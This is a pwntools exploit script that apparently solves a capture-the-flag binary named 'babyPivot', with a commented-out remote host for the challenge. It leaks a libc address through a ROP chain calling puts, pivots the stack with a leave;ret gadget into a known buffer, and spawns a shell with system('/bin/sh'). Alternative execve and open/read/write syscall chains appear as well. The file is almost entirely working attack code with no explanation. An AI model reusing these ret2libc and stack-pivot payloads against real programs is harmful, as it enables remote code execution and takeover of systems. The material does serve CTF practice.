from pwn import *

# p = process("./babypivot")
p = process("./babyPivot",env={"LD_PRELOAD":"./babypivot-libc.so.6"})
# p = remote("pwn.sh4dy.com",5006)

elf = context.binary= ELF("./babyPivot")
libc = ELF("./babypivot-libc.so.6")
context.log_level = 'debug' 

ret=0x000000000040101a
offset_to_rbp = 32
secrets_location = 0x4047a0
leave_ret = 0x00000000004011e6 # : leave ; ret
pop_rdi_ret = 0x00000000004012e3 #: pop rdi ; ret



payload1 = p64(ret) + p64(pop_rdi_ret)+ p64(elf.got.puts)+p64(elf.plt.puts) +p64(ret) + p64(elf.sym.main) 
gdb.attach(p,'init-gef')
p.recvline()
p.recvline()
p.recvline()

p.sendline(payload1)
p.recvline()



payload2= flat(b'a'*offset_to_rbp,secrets_location,leave_ret)
print(len(payload2))

# p.interactive()
p.send(payload2)
p.recvline()


k = p.recvline()[:-1]
k = k.ljust(8,b'\x00')
k = u64(k)
print(k)
libc.address = k - libc.symbols.puts
print(hex(libc.address))



system = libc.sym.system
binsh = next(libc.search(b'/bin/sh\x00'))
print(hex(binsh))


payload3= flat('\x00'*200,ret,ret,pop_rdi_ret,binsh,ret,system)



POP_RAX = 0x0000000000036174 + libc.address
POP_RDI = 0x0000000000023b6a + libc.address
POP_RSI = 0x000000000002601f + libc.address
POP_RDX = 0x0000000000142c92 + libc.address
SYSCALL = 0x00000000000630a9 + libc.address

# pop_rdi_ret = libc.address + 0x0000000000023b6a
# pop_rsi_ret = libc.address + 0x000000000002601f
# pop_rdx_ret = libc.address + 0x0000000000142c92
# pop_rax_ret = libc.address + 0x0000000000036174
# # syscall = libc.address + 0x000000000002284d
# syscall = libc.address + 0x00000000000630a9

# payload = flat(
#     b'a'*offset,
#     ret,
#     pop_rax_ret,
#     0x2,
#     pop_rdi_ret,
#     0x402020,
#     pop_rsi_ret,
#     0x0,
#     pop_rdx_ret,
#     0x3,
#     syscall,
#     pop_rax_ret,
#     0x0,
#     pop_rdi_ret,
#     0x3,
#     pop_rsi_ret,
#     0x404090,
#     pop_rdx_ret,
#     0x50,
#     syscall,
#     pop_rax_ret,
#     0x1,
#     pop_rdi_ret,
#     0x1,
#     pop_rsi_ret,
#     0x404090,
#     pop_rdx_ret,
#     0x50,
#     syscall,
#     ret,
#     p64(elf.sym.waifusSecret)
# )



payload = flat(
    '\x00'*200,
    ret,
    POP_RAX,
    0x3b,
    POP_RDI,
    binsh,
    POP_RSI,
    0x0,
    POP_RDX,
    0X0,
    SYSCALL
)



p.recvline()
p.recvline()
p.recvline()

print(payload3)
p.sendline(payload3)
# p.interactive()

# p.recvline()
payload4= flat(b'a'*offset_to_rbp,secrets_location+201,leave_ret)
p.send(payload4)
print(payload4)
p.interactive()



